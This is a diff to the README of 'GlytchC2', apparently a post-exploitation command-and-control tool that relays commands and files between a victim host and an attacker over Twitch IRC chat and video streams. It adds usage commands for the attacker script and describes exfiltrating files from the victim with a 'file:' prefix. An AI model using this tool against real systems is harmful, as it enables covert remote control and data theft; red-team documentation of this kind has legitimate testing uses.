@@ -30,6 +30,7 @@ Currently, **"GlytchC2"** offers two functionalities:
 
 - As this tool can be used on post-exploitation, you need a working shell on the target environment and have necessary permissions/privileges.
 - When you execute ``victim.py`` on the target host, host gets connected to the IRC chat of given channel by using provided "oauth" key in the ``.env`` file. You can execute ``victim.py`` with following command:
+
 ```
 # cd victim
 # python3 victim.py --channel <CHANNEL_NAME> --streamkey <RTMP_KEY>
@@ -40,6 +41,11 @@ Currently, **"GlytchC2"** offers two functionalities:
 <p align="center"> Figure - Running "victim.py" </p>
 
 - After victim side is up and waiting for a request, attacker needs to connect corresponding channel's IRC chat:
+
+```
+# cd attacker
+# python3 attacker.py --channel <CHANNEL_NAME>
+```
 
 <p align="center"> <img src="rsc/attacker_initialexec.PNG" /> </p>
 <p align="center"> Figure - Running "attacker.py" </p>
@@ -77,7 +83,7 @@ Currently, **"GlytchC2"** offers two functionalities:
 <p align="center"> <img src="rsc/attacker_output1.PNG" /> </p>
 <p align="center"> Figure - Decoded Frame Content (Result of "whoami" OS command) </p>
 
-- We can also request a file, e.g. ``systeminformer-3.2.25011-release-setup.exe``:
+- We can also request a file with ``file:`` prefix, e.g. ``systeminformer-3.2.25011-release-setup.exe``:
 
 <p align="center"> <img src="rsc/victim_targetfile.png" /> </p>
 <p align="center"> Figure - "systeminformer-..." File Located In Victim </p>
